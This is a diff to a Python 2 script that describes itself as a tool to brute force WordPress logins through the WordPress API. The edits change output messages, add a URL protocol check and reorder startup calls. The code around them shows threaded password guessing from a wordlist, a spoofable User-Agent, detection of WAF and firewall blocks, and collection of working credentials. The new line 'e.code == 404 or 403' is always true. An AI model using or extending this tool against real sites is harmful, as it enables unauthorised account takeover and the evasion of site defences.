@@ -108,7 +108,7 @@ def TestSite(url):
         sys.exit()
     except socket.timeout as e:
         print type(e)
-        print "The socket timed out, try it again.  (Site may down)"
+        printout("The socket timed out, try it again.", YELLOW)
         sys.exit()
 
 
@@ -117,7 +117,7 @@ def PasswordAttempt(user, password, url, thread_no):
         if args.debug is True:
             thready = "[Thread " + str(thread_no) + "]"
             printout(thready, YELLOW)
-        print "Trying " + user + " : " + password
+        print "Trying " + user + " : " + password + "\n",
     headers = {'User-Agent': args.agent,
                'Connection': 'keep-alive',
                'Accept': 'text/html'
@@ -142,7 +142,7 @@ def PasswordAttempt(user, password, url, thread_no):
         except:
             pass
     except urllib2.URLError, e:
-        if e.code == 404:
+        if e.code == 404 or 403:
             global total
             printout(str(e), YELLOW)
             print " - WAF or security plugin likely in use"
@@ -160,8 +160,14 @@ def PasswordAttempt(user, password, url, thread_no):
             print user + ":" + password + " was skipped"
     except socket.error as e:
         printout(str(e), YELLOW)
-        print " - Got an RST, Probably tripped the firewall"
+        print " - Got an RST, Probably tripped the firewall\n",
         total = len(passlist)
+        sys.exit()
+
+
+def protocheck():
+    if "http" not in args.url:
+        printout("Please include the protocol in the URL\n", YELLOW)
         sys.exit()
 
 parser = argparse.ArgumentParser(description='This is a tool to brute force Worpress using the Wordpress API')
@@ -180,9 +186,11 @@ totalusers = len(userlist)
 f = open(args.wordlist, 'r')
 passlist = f.read().split('\n')
 correct_pairs = {}
-PrintBanner()
-TestSite(url)
 total = 0
+PrintBanner()
+protocheck()
+TestSite(url)
+
 list_array = slice_list(passlist, args.threads)
 BuildThreads(list_array,url)
 while (len(correct_pairs) <= totalusers) and (len(passlist) > total):
